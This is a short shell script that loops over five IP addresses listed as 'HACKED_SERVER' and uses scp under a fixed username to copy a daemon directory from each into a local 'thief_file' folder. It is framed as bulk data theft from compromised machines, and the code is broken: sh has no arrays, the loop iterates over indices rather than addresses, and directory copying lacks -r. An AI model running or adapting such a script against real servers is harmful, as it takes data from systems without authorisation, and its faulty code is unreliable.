#!/bin/sh

HACKED_SERVER=("100.64.176.36" "100.64.176.37" "100.64.176.38" "100.64.176.39" "100.64.176.40")

for server in ${!HACKED_SERVER[*]}
do
  scp ddarczuk@$server:/daemon/daemon_dir/ ./thief_file/
done

